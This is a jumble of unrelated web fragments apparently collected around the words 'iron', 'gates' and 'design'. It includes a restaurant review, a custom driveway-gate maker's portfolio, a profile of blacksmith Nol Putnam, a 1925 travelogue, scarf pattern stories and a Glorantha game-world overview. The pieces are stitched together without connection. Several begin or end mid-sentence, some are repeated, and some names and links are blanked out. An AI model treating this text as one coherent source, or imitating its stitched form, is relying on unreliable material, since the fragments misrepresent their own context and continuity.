menu.&#x201d;&#xa0;&#xa0;Which turned out to be quite a lot.&#xa0;Focaccia, trio of dips, trio of cheeses, trio of olives (haha &#x2013; a trio of trios!), crispy Jerusalem artichokes, winter root vegetable salad, farro salad, and pasta.&#xa0;&#xa0;The flavors and ingredients played off of each other deliciously &#x2013; the food at once combined the lightness of the Mediterranean, with ingredients that felt appropriately wintery.&#xa0;&#xa0;The one non-vegetarian in our foursome enjoyed partaking in our offerings, while also taking great pleasure in his non-veggie entr&#xe9;e.</p>   <p>We&#x2019;ll go again and often.&#xa0;&#xa0;Look forward to visiting the dining room in the future and enjoying the patio throughout the year</p>  </div>

I&#x2019;ve tried to provide everything we would want and hopefully our wishes/needs will match yours. On the appliances side, there&#x2019;s a 4-ring electric ceramic hob, and oven, dishwasher, fridge/freezer, toaster, kettle, microwave.</p>   <p><strong>Living room</strong> &#x2013; The spacious living room has comfy sofas and an open fireplace.

   <div>   <h2>Decorative <b>Gates</b> featuring Handmade Trees</h2>   <h4>&amp; More!</h4>   <p>Here you can see some of the <strong>custom</strong> <strong>tree themed driveway</strong> <strong><b>gates</b> </strong>we&#x2019;ve built over the years. We build them all by hand, no two are quite the same. We work with individuals and/or their contractors to provide a gate that will be the perfect fit into their driveway entrance. Our <b>gates</b> will work with most gate openers</p>   <h2>Minnesota Oak Tree Driveway Gate</h2>   <p>This beautiful <strong>oak tree driveway gate</strong> is flanked by two massive stone columns and safeguards a log home located on an exceptional walleye fishing lake north of <strong>Minneapolis,</strong> <strong>Minnesota.</strong> We custom built the <b>gates</b> in <strong>Columbus, Ohio</strong> to fit the existing stone columns. All measurements were coordinated ahead of time and the communication worked out quite well because the <b>gates</b> fit their new resting spot perfectly. The overall height of these oak tree themed <b>gates</b> is about 10&#x2032; after we hung them.</p>   <h2>Texas Driveway <b>Gates</b></h2>   <h3>Featuring Tree &amp; Horse Theme</h3>   <p>These feature a two-tone powder coated finish. We also added horses and a silhouette of our client&#x2019;s dog to create a plasma cut scene.</p>   <h2>Charleston, SC Driveway <b>Gates</b></h2>   <p>This dual swing <b>iron</b> gate is mounted to steel posts and brick columns with automated electric gate openers attached.

The tree is plasma cut from 3/16&#x2033; steel sheet and bolted to the square tubing frame of the gate. The two horse silhouettes were also plasma cut and then welded onto the pickets of the gate. Everything was powder coated black in our new powder coat oven.</p>   <h2>Indiana Oak Tree Driveway <b>Gates</b></h2>   <p>Below is a set of <strong>custom cut <b>gates</b></strong> leaning against the side of my shop after the paint cured, shortly before being loaded up and hauled to Indiana where it was installed along with another set just like it. Each set was built for a 20&#x2032; opening between stone columns.</p>   <h2>Chattanooga TN Curly Tree Driveway <b>Gates</b></h2>   <p>These Chattanooga, TN driveway <b>gates</b> were a really cool project we did for some fantastic people up on Signal Mountain at the &#x201c;Wicked Ranch&#x201d;.&#xa0; The side boxes are lit from the inside at night. The gate opener system is powered by a solar panel.</p>   <p>Another picture of the <strong>Chattanooga TN entry gate</strong>, this time in the shop.</p>   <h2>Wisconsin Oak Tree Driveway <b>Gates</b></h2>   <h3>16&#x2032; dual swing</h3>   <p>Dual swing 16&#x2032; <strong>entry gate</strong> with oak tree theme built for a landscaping contractor&#x2019;s residence located in the central <strong>Wisconsin</strong> area.

My husband was building grills on trailers and smokers in 1988 and that just exploded into bigger and better things.

All our <b>gates</b> are custom-built we have Aluminum <b>gates</b>, Steel <b>gates</b> and <strong>Wrought <b>iron</b> <b>gates</b></strong>, they are all built to the customers specifications. We can help you with Entry <b>gates</b>, Driveway <b>gates</b>, Security <b>gates</b> and Railings. We recommend having the gate or railing powder coated as to painted as they last longer, are easier for the customer to maintain and save you money.

   <div>   <div>    <p>photography by ADAM EWING</p>   </div>   <p>HUNTLY, VIRGINIA<strong> &#x2013;</strong>&#xa0;Nol Putnam forges wind from iron, his hammer&#xa0;metronomic at 2&#xbd; strikes a second, steel against iron against anvil. The angle of the peen and the force of his follow-through shape hot metal the way a rolling pin pushes pastry.</p>   <p>Putnam, 80, has been creating art from iron for more than 40 years. His hands are strong, his shoulders broad, his hearing damaged by the clang and the clatter. Flying sparks have burned constellations into his beret and shards of metal have scarred his skin, yet he awakens each day excited to return to his fire.</p>   <p>Hot like this, the crystalline molecules of the metal slide past one another and re-form under Putnam&#x2019;s tools as delicate petals and leaves, or as soaring swoops and swirls that cantilever out over broad bases. In the sculpture garden outside his White Oak Forge in Huntly, Virginia, 90 minutes north of Charlottesville on rollercoaster roads, the 7-foot-tall&#xa0;<em>West Three Wind</em>&#xa0;circles back on itself three times before shooting back through all three layers and off toward the distant sky. It is part of his series&#xa0;<em>Lines In Space,</em>&#xa0;some of the sculptures man-sized and some small enough to sit on a table, and all inspired by the childhood books by Thornton Burgess, whose Old Mother West Wind is depicted as lines that eddy off toward the horizon.</p>   <p>&#x201c;When you&#x2019;re doing something like that you have to worry about not just the physical engineering of how it&#x2019;s going to stand up and who&#x2019;s going to come play on it,&#x201d; Putnam says, &#x201c;but then how is that negative space or the space you&#x2019;ve defined going to look to the eye?&#x201d;</p>   <p>The sculpture weighs about 400 pounds, yet Putnam made it alone, heating the metal in his 3,000-degree forge, drawing the curves in chalk on the primitive platen table and bending the metal to meet them, then pounding it with both a mechanical air hammer and his own strength and persistence. For weeks he shaped component parts, then lay each out on blocks on his smithy floor, sometimes using a crane to manipulate them into position, sometimes welding them to the bucket of his tractor in order to keep them in place.</p>   <p><strong>Today he is working with</strong>&#xa0;pure iron imported from England &#x2013; &#x201c;like forging butter, relatively,&#x201d; he says, using tongs to hold a finger-width rod into the fire. Pure iron has a fibrous grain like that of wood, which makes it easy to stretch and bend and shape. Add a little carbon into the latticework of the iron and you create steel, a material much stronger but also more rigid, and thus harder to transform into items of delicate beauty.</p>   <p>Putnam turns a rheostat that controls a fan that blows air through the hot coals, the bellows long gone. He pushes the green coal to the edges of the fire with a toothless rake and pulls more coke toward the center. The rake was the first tool he ever made, and he uses it every day, all day, its handle smooth in his calloused palm. On the side of the forge are a pair of tongs he made himself, and a pair given to him by his mentor. There&#x2019;s a center punch, too, salvaged from the smithy of his best friend when he died half a decade back.</p>   <p>The iron glows red, itself nearing 2,200 degrees, and Putnam carries it to the anvil and begins his rhythmic pounding, each strike precise.</p>   <p>&#x201c;People come in and say, &#x2018;Oh, you&#x2019;re such an artist,&#x2019; which is very flattering,&#x201d; he says, &#x201c;but what they don&#x2019;t understand is that it&#x2019;s about 90 percent practice and only 10 percent genius. In any profession you develop the skill by practice, and that&#x2019;s what most people don&#x2019;t do.&#x201d;</p>   <p>Indeed, his former mentor would give beginners a two-by-four with an X drawn on one end, and only when they could hit the X each time with the center of their hammer were they allowed to work with iron.</p>   <p>Putnam strikes the end of the rod 43 times to bring it to a point, then&#xa0;returns it to the fire.</p>   <p>Both the building and the fire that is the heart of the building are called forges, although the building can also be called a smithy. This is Putnam&#x2019;s&#xa0;seventh, the design winnowed by him from what worked in the ones that came before. There are skylights over the anvil for natural light, and broad windows that frame birds and trees and the pond that separates his workshop from his home. The chimney rises 22 feet &#x2013; the higher the chimney, the better the draw; the better the draw, the hotter the fire. The Venturi effect pulls ash and smoke up the chimney and out of the shop. The floor is 4-inch-thick reinforced&#xa0;concrete; his pneumatic hammer sits on a massive block of wood that rests on its own 4-foot cube of concrete, set deeper than the building&#x2019;s footers so that the vibration of the machine won&#x2019;t set up a resonance that will crack the floors and 12-foot-tall walls.</p>   <p>The beam-mounted crane is 2 feet higher still, giving Putnam room to manipulate long lengths of iron without bashing lights or banging the&#xa0;ceiling. Hundreds of hammers hang next to the forge, the handles of his favorites smooth from use. Nearby are racks of U-shaped forms, some narrow, some wide, designed sometime along the 3,000-year history of man&#x2019;s manipulation of metal. The bottom half of the form is designed to fit into a slot in the anvil; the upper form has a hole for a handle like a hammer&#x2019;s. In a two-person shop the upper form is held by the blacksmith while an apprentice strikes it from above, squeezing and shaping the hot metal inch by inch. In Putnam&#x2019;s shop the striking is done by his pneumatic hammer &#x2013; his mechanical apprentice &#x2013; a machine so brutish it can crush metal, yet with Putnam&#x2019;s trained toes on the air pressure level is gentle enough to close a matchbox without crushing a corner.</p>   <p>Putnam pulls the red metal again from the fire and aligns it under the head of the massive air hammer. Pound after pound it flattens the metal into a lozenge, a flat lollipop on its way to becoming a leaf, its color fading from orange to gray.</p>   <p>&#x201c;This is where it&#x2019;s dangerous,&#x201d; he says, holding the back of his hand over the piece to confirm. The color is gone but the temperature still hovers at about 1,000 degrees. He sticks the metal back into the fire.</p>   <div>    <p>photography by ADAM EWING</p>   </div>   <p>Nol Putnam grew up on a farm,&#xa0;working with his hands. He adored three-dimensional geometry, and lived a life rich with books and&#xa0;music. He became a teacher of&#xa0;history and the creator of cultural bridges between incoming Native American students and the faculty of a western Massachusetts boarding school. He was in his late 30s when he read a library book on blacksmithing and used it and his dad&#x2019;s hammer &#x2013; plus a lot of self-described stubbornness &#x2013; to begin his new career. In his first decade he paid his dues making hooks and andirons and fireplace tools, then standing in heat and rain and cold at craft fairs, peddling his wares.</p>   <p>In the next decade he turned his tools to architectural and structural work &#x2013; balconies and railings and ornate iron gates of steel and copper and brass. The ideas come to him in dreams, fully formed; his job then is to awaken and capture them onto bedside paper and then to translate those sketches into something clients can understand.</p>   <p>For the Rockefeller family he forged brass into a 16-foot-wide gate adorned with a delicate tree. For what he called his &#x201c;Rousseau Gate&#x201d; he created nine leaves, 3 and 5 and 8 feet tall. For each commission he visits the site, talks with the clients about their vision, then returns later with two sketches. He could make more, but the conversations would then be complicated.</p>   <p>&#x201c;I encourage clients to mark up the drawings, to say yea and nay, to tell me what they like and don&#x2019;t,&#x201d; he says. &#x201c;I don&#x2019;t like commission work to simply be an exchange of money. I prefer for the clients to be part of the process, even to the point of coming down and taking a ceremonial whack just to see what it&#x2019;s like. Then the whole piece becomes more meaningful for everybody.&#x201d;</p>   <p>Now he pulls the flat leaf from the fire and draws a mental line down its center, then hammers on one side of it and then the other.</p>   <p>&#x201c;See the line down the middle?&#x201d; he says. &#x201c;Now I&#x2019;m going to put some veins it and then whiffle it so it look like it has some life.&#x201d;</p>   <p>He returns it to the fire.</p>   <p>Putnam forged 250 petals and leaves&#xa0;of a much heavier iron for a pair of gates that hang in the National Cathedral in Washington. The ornate Folger Gate, installed in 1995, frames the entryway to the columbarium in the Chapel of St. Joseph of Arimathea. Nearby hangs Putnam&#x2019;s Brown Gate, and behind that the ashes of ambassadors and bishops, architects and musicians, but also those of Helen Keller and her caregiver, Annie Sullivan.</p>   <p>&#x201c;It&#x2019;s a beautiful building, but it&#x2019;s a little overwhelming to think about being there,&#x201d; he says.</p>   <p>He got the job through word of mouth, and&#xa0;began work with nothing more than a handshake. For the next year and a half he worked &#x2013; 1,200 hours of forming flowers and forging the frame. The pistil on each flower and the rivets that connect the crosspieces are all different; one depicts the face of Yoda from&#xa0;<em>Star Wars</em>.</p>   <p>The gates had to meet specifications for how they hung in the arched entryway, and they had to open and close, and latch smoothly. Beyond those parameters Putnam was free to design to his own vision.</p>   <p>&#x201c;I was just really fortunate &#x2013; that I was given the chance and that I could rise to the occasion,&#x201d; he says. &#x201c;Fortunately, I think it&#x2019;s some of the best work I ever did.&#x201d; The gates are considered to be part of the fabric of the building, the things that give life to the structure: the stone carvings, the windows, the tapestries, the ironwork &#x2013; everything that gives it texture.</p>   <p>He was hired by Canon Richard T. Feller, the longtime and well-known Clerk of the Works &#x2013; chief administrator in charge of all construction and artwork for the cathedral, the sixth-largest in the world.</p>   <p>&#x201c;He was a serious man who took his work very seriously and demanded that everybody else do the same,&#x201d; Putnam says. &#x201c;It made him sometimes difficult to work with. I didn&#x2019;t particularly have a problem with it, but he held your nose to the grindstone in order to get your best work, and it was a valuable lesson.&#x201d;</p>   <p>In the midst of that work, another office of the cathedral called. Former President Gerald Ford was ill, and if he died he would come to the cathedral to lie in state, yet all the cathedral owned were four &#x201c;tacky, wobbly wooden candlesticks,&#x201d; Putnam says. &#x201c;They called me up, desperate, and said, &#x2018;Please please, we need this immediately!&#x2019; &#x201d;</p>   <p>There are few emergencies in artisanal blacksmithing, nor can things easily be rushed. Luckily, President Ford did not die at that time, but the candlesticks, tall and simple and reflective of some of the patterns in the stonework, still stand sentinel.</p>   <p><strong>Putnam pulls the leaf from the fire</strong>&#xa0;and holds it on the forward-pointing cone of the anvil. He taps the metal with his hammer, twisting the leaf until it looks blown by the wind. Then he positions a chisel-like hardy upright in the tool slot of the anvil, lays the leaf&#x2019;s stem across the hardy&#x2019;s edge and takes four solid whacks, slicing nearly through the stem. It is poor form, he says, to cut all the way through and send the hot metal shooting across the shop. Years ago a piece broke loose and whacked him on the head and knocked him out cold.</p>   <p>He clamps the leaf to a workbench and uses a screaming electric grinder to blunt the sharp edge, then holds the leaf and a stamp of his initials under the head of a foot-powered hammer &#x2013; a tool invented in Michelangelo&#x2019;s day &#x2013; and stomps, impressing his initials into the stem, then buffs the leaf with a spinning wheel of wire bristles. Last, he paints it with his homemade elixir of turpentine, linseed oil and beeswax, and buffs it dry.</p>   <p>&#x201c;Now imagine doing all those steps to every component of the cathedral gate,&#x201d; he says, as he holds up the completed leaf.</p>   <p>&#x201c;Patience is a virtue,&#x201d; he says, his voice as&#xa0;cadenced as his hammer, &#x201c;seldom in a woman &#x2026; never in a man &#x2026; but always in a blacksmith.&#x201d;</p>   <p><em>inally published in&#xa0;,&#xa0;May 10, 2014</em></p>  </div>

   <div>   <div>    <div>     <div>      <div>       <h1>Wrought <b>Iron</b> Gate Project</h1>      </div>       <div>       <div>        <span>I replaced this old rotten gate back in August of 2014.&#xa0; My client wanted it changed from wood to wrought <b>iron</b> with modest decorative <b>iron</b>, and high enough to keep the deer out.&#xa0; This is the beginning of what will be incorporated into a several hundred foot wrought <b>iron</b> fence dividing their property from the neighbors that I&#x2019;ll be building in the future, thus replacing theturquoise fence with matching wrought <b>iron</b>.&#xa0; Instead of screwing the gate together as is more conventional, I set posts through the slab and welded everything together for the ultimate rigidity and longevity.</span>       </div>       <div>        <span>&#xa0;</span>       </div>       <div>        <span>Challenges included anchoring/drilling through concrete slab to set posts as well as the severe incline to the landscaping adjacent to the left side of the gate. Also as you can see, the old gate wasn&#x2019;t square with the house and very structurally fatigued from its high ratio width. Below you can see how it started:</span>       </div>      </div>       <div>       <h2>Old Gate (Before)</h2>      </div>       <div>       <div>        <div>         <h3> Old wooden gate </h3>         <p> Dilapidated Old Gate </p>        </div>        <div>         <h3> Bent Hinges </h3>         <p> Hinges were bent on old gate, making it hard to open </p>        </div>        <div>         <h3> Wood Rot </h3>         <p> The old wood gate had started to rot </p>        </div>        <div>         <h3> Old Post Removal </h3>         <p> This post that was sunk into the concrete had to be removed prior to installing the <b>iron</b> replacement post </p>        </div>       </div>       </div>       <div>       <h2>New Gate (After)</h2>      </div>       <div>       <div>        <div>         <p> Gate when completed </p>        </div>        <div>         <h3> Latch System </h3>         <p> Custom fabricated latch system </p>        </div>        <div>         <h3> Gate Open </h3>         <p> Gate hinge system was designed to homeowner&#x2019;s request to swing outwards </p>        </div>        <div>         <h3> Latch </h3>         <p> Close-up of latch system </p>        </div>       </div>       </div>       <div>       <div>        <p><strong>Homeowner Testimonial </strong></p>        <p>We&#x2019;ve lived in our current home for almost twenty years, and the gate that we had attached to our side yard was another ten years old on top of that! After many years of sun damage and rot, it was well past due to replace our gate. Joel worked tirelessly on the custom <b>design</b> and sourced the materials quickly. Initially, we only had a rough idea of an <b>iron</b> gate, but Joel&#x2019;s artistic touch for rounding out the details came out beautifully in the final product. We couldn&#x2019;t be happier with our new gate and it certainly improved the overall look of our home.</p>        <strong>Maryann Santos</strong>       </div>       </div>      </div>     </div>    </div>   </div>  
   <div>   <p><b>February 28, 2014</b></p>   <p>Recently re-opened, the Iron Gate has two seating options.&#xa0;&#xa0;First come, first serve at the somewhat covered carriage house which houses a bar and a handful of tables, or tasting menu in the dining room.&#xa0;Unable to get a convenient reservation (and dying to try it out), we settled for the carriage house.</p>   <p>So, how does a restaurant that is effectively outside manage to be &#x201c;completely committed&#x201d; with an hour wait when it is below freezing?</p>   <p>Even though the temperature outside was ghastly frigid, Iron Gate radiated warmth (not insignificantly due to the generous use of heating elements), comfort, and sophistication.&#xa0;&#xa0;We waited for a table while enjoying the ambience of the lovely bar and the delightful cocktails.&#xa0;&#xa0;If it were just the two of us, we probably would have chosen to eat there.</p>   <p>(By the way, for long-married couples, a great way to avoid inane conversation is sitting at the bar, while the barkeep pretends to be your friend in order to extract a large tip at the end of the evening. Otherwise, table discussion often devolves to &#x2013; &#x201c;K: I have to do laundry tomorrow.&#xa0;&#xa0;J: I did it already.&#xa0;&#xa0;K: Did you fold it?&#xa0;&#xa0;J: No.&#xa0;&#xa0;K: Did you do the towels?&#xa0;&#xa0;J: I forgot.&#xa0;&#xa0;I haven&#x2019;t used mine in a few days.&#xa0;&#xa0;K:&#xa0;&#xa0;Wow.&#xa0;That&#x2019;s a great way to start date night.&#xa0;&#xa0;And I have to do laundry tomorrow.&#x201d;&#xa0;&#xa0;Large tip very worthwhile.)</p>   <p>We digress.&#xa0;&#xa0;Onwards to dinner, where we were provided with blankets for added warmth.&#xa0;&#xa0;(K: Loved it.&#xa0;&#xa0;J: Be aware of other people&#x2019;s blankets.&#xa0;&#xa0;That&#x2019;s how the Europeans spread small-pox to Native Americans.&#xa0;&#xa0;K: Said from a person that hadn&#x2019;t showered &#x201c;in a few days.&#x201d;)</p>   <p>Wine, a 2006 barolo per the recommendation of the manager, was probably one of the best bottles we&#x2019;ve had in some time.</p>   <p>Our dinner order was literally &#x201c;everything vegetarian on the menu.&#x201d;&#xa0;&#xa0;Which turned out to be quite a lot.&#xa0;Focaccia, trio of dips, trio of cheeses, trio of olives (haha &#x2013; a trio of trios!), crispy Jerusalem artichokes, winter root vegetable salad, farro salad, and pasta.&#xa0;&#xa0;The flavors and ingredients played off of each other deliciously &#x2013; the food at once combined the lightness of the Mediterranean, with ingredients that felt appropriately wintery.&#xa0;&#xa0;The one non-vegetarian in our foursome enjoyed partaking in our offerings, while also taking great pleasure in his non-veggie entr&#xe9;e.</p>   <p>We&#x2019;ll go again and often.&#xa0;&#xa0;Look forward to visiting the dining room in the future and enjoying the patio throughout the year</p>  </div>

   <div>   <div>    <p>Ursula on the Grand Front Terrace at Ch&#xe2;teau Cabri&#xe8;res, France (Photo published in &#x201c;Themis&#x201d; of Zeta Tau Alpha)</p>   </div>   <p>Last week, I posted&#xa0;&#xa0;of Ursula&#x2019;s European adventure&#x2014;written by Ursula, herself! Here&#x2019;s part two, a richly detailed account of studying and living at famous opera singer Emma&#xa0;Calv&#xe9;&#x2019;s castle in southern France. Ursula&#x2019;s travelogue was originally published in her&#xa0;sorority&#x2019;s quarterly journal,&#xa0;<i>Themis</i>&#xa0;of Zeta Tau Alpha, in March 1925.</p>   <p>[Part two] <strong>Studying and Traveling Abroad</strong> By Ursula Claire Cheshire</p>   <p>&#x201c;Ch&#xe2;teau de Cabri&#xe8;res, the home of Mme. Calv&#xe9;, is in the southern part of France, on one of the highest peaks of the Cevene mountains, miles away from any real city. The castle is old Roman style with large round towers, and dates back to the year 1050 A.D. Huge iron gates are at the entrance of the grounds, which are surrounded by thick stone walls, while at the entrance of the ch&#xe2;teau there are two ancient iron bolted doors, one leading into an open court and the other into the hallway.</p>   <div>    <p>Ch&#xe2;teau Cabri&#xe8;res</p>   </div>   <p>The rooms of the ch&#xe2;teau are all exquisitely furnished with things from all parts of the globe. Three rooms appealed to me particularly. First the ancient guard room (now used for the dining room) with its original stone floor, ceiling and fireplace; next the salon with its large carved furniture, and then the Louis XIV bedroom with its heavily handcarved Louis XIV bed.</p>   <p>The castle was an ideal place to study. There was nothing near to bother us. There was nothing near to hear us. We could sing to the many mountain peaks on all sides, with only the sheep on the hillside, or the oxen in the valley, to hear the echoes of our voices.</p>   <div>    <p>French naturalist Jean Henri Fabre</p>   </div>   <p>Yet sometimes this tranquility was broken, for we had guests from near and far&#x2014;musicians, artists and even reporters. When from our heights we would see an auto turn off the main highway below and start to climb the mountain road, that was our signal to prepare for company. Also at different times we would give concerts in the near-by towns, which necessitated short trips, and again our studies would be put aside for a while. One very interesting program was given at Rodez, the capitol of the department of Aveyron, to raise funds for a monument to the great French naturalist, Henri Fabre.</p>   <p>I will never forget my first soir&#xe9;e at the ch&#xe2;teau. Guests came from all around to give us a f&#xea;te, bringing with them pastries, bonbons, wine and champagne, and a grand feast was spread. The evening was spent in dancing and singing and I had a rather interesting time trying to converse with our guests with my then small French vocabulary.&#x201d;</p>   <p><em>To be continued&#x2026;</em></p>   <p><em>&#xa0;</em></p>  </div>

   <div>   <p>A craftsman is the Designer, Manufacturer and Salesmen all in one.</p>   <p>Prior to the industrial revolution, a &#x201c;village smithy&#x201d; was a staple of every town.&#xa0;&#xa0; A blacksmith is a person who creates products from wrought <b>iron</b>&#xa0;or steel&#xa0;by forging&#xa0;the metal; that is, by using tools to hammer, bend, and cut hot metal. &#xa0;Figure 1. shows a blacksmith at work.&#xa0; Blacksmiths produce products such as <b>gates</b>, grilles, railings, light fixtures, furniture, sculpture, tools, agricultural implements, decorative and religious items, cooking utensils, and weapons.&#xa0;&#xa0;&#xa0;Since the blacksmith designed the product, manufactured the product&#xa0;and sold the product, he knew what problems his cutomeers wanted solved, how to <b>design</b> a solution to the problem and how to manufacture the solution.&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;Figure 1. A blacksmith at work forging a product.</p>   <p>As long at the <b>design</b>, manufacure and sales functions were all carried out by one person no communication problems existed.&#xa0; However, when technology became more complex people began to specialize in different areas of the product <b>design</b> cycle.&#xa0; This gave rise to sales people, manufacturing experts, desing experts and a <b>design</b> process known as <b>design</b>.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>&#xa0;</p>  </div>

   <div>   <h3>Barbara Northrup patterns are&#xa0;produced as limited editions. Each pattern I design starts with an image that has inspired me in some way. &#xa0;That story of inspiration is an important part of what makes my designs unique. Every scarf &#xa0;comes with a numbered card that features the original image and its story.</h3>   <p>&#xa0;</p>   <h4>Pattern Stories:</h4>   <p>&#xa0;</p>   <div>    <div>     <div>      <h4><strong>No. 71 Parrot</strong></h4>      <p><strong>Aqua &amp; Fuchsia</strong></p>      <p>The bright color combinations of Parrots create some of the most fascinating patterns in nature. A blue and gold Macaw provided the basis for this design.&#xa0; I am intrigued by the subtle variations in color found in the individual feathers and even more so, by the moir&#xe9; pattern that is visible when viewed up close.</p>      <p>&#xa0;</p>      <h4><strong>No.&#xa0;83 Cockles</strong></h4>      <p><strong>Cerulean &amp; Tangerine</strong></p>      <p>Occasionally hurricanes pass by off the shore of Coastal Georgia and in their wake they leave shell covered beaches.&#xa0; After a storm some years ago, the beach was so thick with Cockle Shells you could barely see the sand. &#xa0;I overlaid the image of the cockles with one of swirls and scrolls to reflect the blowing winds and waters that moved these shells up onto the land from their home on the sea floor.</p>      <p>&#xa0;</p>      <h4><strong>No.&#xa0;93 Driftwood</strong></h4>      <p><strong>Azure &amp; Magenta</strong></p>      <p>Driftwood beaches are common along the coastlines of Georgia and the Carolinas.&#xa0; They are places where the ocean is taking back the land. &#xa0;These forested shorelines are slowly giving way to the sea leaving an eerie landscape of wooden skeletons.&#xa0; The curved shapes of the branches and shadows in this image produced a pattern that reminds me of antique marbled bookend paper.</p>      <p>&#xa0;</p>      <h4><strong>No. 87 Moroccan Leaf</strong></h4>      <p><strong>Indigo &amp; Scarlet</strong></p>      <p>I love it when the unexpected happens. This pattern started with a simple and earthy image of a vine growing along a wall.&#xa0; I was intrigued by the peeling paint, the shapes of the leaves and the pop of bright red. To my delight, the resulting pattern developed into an intricate and delicate pattern reminiscent of Ottoman mosaics.</p>     </div>     <div>      <div>       <h4><strong>No.&#xa0;97 Zebra Tush</strong></h4>       <p>Yes, that is his derriere!&#xa0; Zebras are my favorite animal to photograph.&#xa0; Head to toe and back to front, they provide such wonderful graphic interest. &#xa0;This guy had a very sweet face but what really caught my eye was the strong back line and curved fine lines that accentuated this animal&#x2019;s rump.</p>      </div>     </div>     <p>&#xa0;</p>     <div>      <div>       <p>&#xa0;</p>       <h4><strong>No. 89 Daisy Days</strong></h4>       <p>Summertime in the Appalachian Mountains is beautiful.&#xa0; Cool green forests open into fields of daisy flowers that cover the landscape with randomly patterned carpets of color.&#xa0; This design reflects the lively, carefree and colorful fun of summer in a mountain meadow.</p>       <p>&#xa0;</p>       <p>&#xa0;</p>      </div>     </div>    </div>   </div>  </div>

He's managed to loosen some of the bricks and I can't get him to pay &#x2013; I can't prove he did it!</p>        <p>I've asked him to stop, but he still insists on doing it. Is it ok of me to stick wrought iron fencing on top of the wall (yes, it is my wall, not the neighbour's)? Maybe with some spikes so he can't possibly jump it..? Simsterboy: I tried that. They were of the same position as him &#x2013; I can't prove that it is he who is doing the damage. </p>        <div>         Posted by Devolution        </div>       </div>      </div>      <div>       <div>        <strong>amer icus</strong>        <p>Yes you can put up wrought iron fencing on top of your wall.

   <article>   <header>    <h1>Glorantha</h1>   </header>   <section>    <h2><strong>What is Glorantha?</strong></h2>    <p>Glorantha is the mythical world that can be found on the Other Side of our consciousness. First discovered by Greg Stafford over forty years ago, Glorantha has been explored in such games as Dragon Pass, RuneQuest, HeroQuest, and King of Dragon Pass.</p>    <p>Glorantha is a cube of earth some 5000 miles wide surrounded by the limitless Sramak&#x2019;s River. Above the world is the Sky Dome, where the stars and planets nightly dance across the heavens. Each morning the Sun emerges from the <b>Gates</b> of Dawn, and travels across the Sky Dome until it reaches the <b>Gates</b> of Dusk. The Sun then travels through the Underworld during the Night before remerging from the <b>Gates</b> of Dawn to begin a new Day.</p>    <p>The Inner World, the world of mortals, is shaped like a huge cube of earth floating in a limitless sea of water.&#xa0;Two major continents, named Genertela and Pamaltela, and a myriad of minor islands rise from this mass above the surface of the infinite sea.</p>    <p> is the northern continent of Glorantha. It is largely temperate in climate; its winds generally blow west to east, and often from the north during Dark Season. The continent is 3,125 miles long and 1,100 miles wide. The popular settings of , the Holy Country, the Lunar Empire, and Prax are all in Genertela.</p>    <p> is the southern continent of Glorantha. The continent is 4200 miles long and 2000 miles wide. Winds generally blow east to west, and occasionally from the hot south. Most of Pamaltela is tropical in climate. Although the Sun comes closer to Pamaltela in the winter and is further away in the summer, that does not mean the southern continent&#x2019;s seasons are reversed from those in Genertela, as the summer days are still longer and hotter, winter days cooler and shorter.</p>    <p>Although there are scores of human cultures in Glorantha, eight are most widespread.&#xa0;<span>The cultures are arranged by their predominant type of social organization: primitive, nomadic, chiefdom, or civilized. The most technologically advanced human cultures are comparable to our Bronze Age or Early <b>Iron</b> Age (without the <b>iron</b>). The eight cultures are: </span></p>    <ul>     <li>The primitive hunter-gatherers represented by the&#xa0;&#xa0;and the Doraddi&#xa0;cultures;</li>     <li>The nomadic pastoralists, represented by the Praxian culture;</li>     <li>The bronze-working tribal chiefdoms, represented by the&#xa0;&#xa0;culture; and</li>     <li>The urban civilizations, represented by the Pelorian,&#xa0;, Western, and Kralorelan cultures.</li>    </ul>    <h2>Elder Races</h2>    <p>The elder races of Glorantha include:</p>    <ul>     <li>The elves or&#xa0;&#xa0;&#x2013; walking sentient plants that have a superficial resemblance to humans;</li>     <li>The dwarves or&#xa0;<strong>Mostali&#xa0;</strong>&#x2013; immortal crafters that seek to repair the World Machine broken by the Gods War;</li>     <li>The trolls or&#xa0;<strong>Uz</strong>&#xa0;&#x2013; creatures of darkness descended from underworld demons and cursed by the gods of Light;</li>     <li>The&#xa0;<strong>Dragonnewts</strong>&#xa0; &#x2013; the mystic dragon-men who endlessly reincarnate with all their memories from their countless past lives.</li>    </ul>    <p>Although the current Gloranthan Time is believed by many to have begun only 1600 years ago, its mythology and history go back much further, for thousands or even millions of years. Although much of history is dependent on and colored by the local culture, some universal events are believed by many to have taken place. A group of magical philosophers called the God Learners spent centuries codifying the myths and history of Glorantha, and although they are now extinct and hated, the effects of their work can be felt in much modern scholarly work.<span>&#xa0;</span></p>    <p>Dragon Pass is destined to be&#xa0;central battleground for the Hero Wars and is a popular setting for Gloranthan games.</p>    <p>A brief overview of the city of Nochet,&#xa0;one of the greatest cities in Glorantha and ruled by queens and matriarchs.</p>    <p>In Glorantha, the gods and goddesses are real, and play an active and important part in most major events through their followers and cults. The Sun, the Earth, the Air, the Water, the Darkness, and the Moon all have powerful deities associated with them, as do powers such as Death, Life, Change, Stasis, Illusion, Truth, Disorder, and Harmony. There are lesser deities to such things as cats, cows, boats, vengeance, volcanoes, and more.</p>    <p>The provides an objective description of many of the major deities of Glorantha.</p>    <h3>Want more information?</h3>    <p>Search the wiki and consult the </p>    <p>Here are some links to start with:</p>    <ul>     <li>?</li>    </ul>   </section>   </article>

   <div>   <p>A craftsman is the Designer, Manufacturer and Salesmen all in one.</p>   <p>Prior to the industrial revolution, a &#x201c;village smithy&#x201d; was a staple of every town.&#xa0;&#xa0; A blacksmith is a person who creates products from wrought iron&#xa0;or steel&#xa0;by forging&#xa0;the metal; that is, by using tools to hammer, bend, and cut hot metal. &#xa0;Figure 1. shows a blacksmith at work.&#xa0; Blacksmiths produce products such as gates, grilles, railings, light fixtures, furniture, sculpture, tools, agricultural implements, decorative and religious items, cooking utensils, and weapons.&#xa0;&#xa0;&#xa0;Since the blacksmith designed the product, manufactured the product&#xa0;and sold the product, he knew what problems his cutomeers wanted solved, how to design a solution to the problem and how to manufacture the solution.&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;Figure 1. A blacksmith at work forging a product.</p>   <p>As long at the design, manufacure and sales functions were all carried out by one person no communication problems existed.&#xa0; However, when technology became more complex people began to specialize in different areas of the product design cycle.&#xa0; This gave rise to sales people, manufacturing experts, desing experts and a design process known as design.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>&#xa0;</p>  </div>

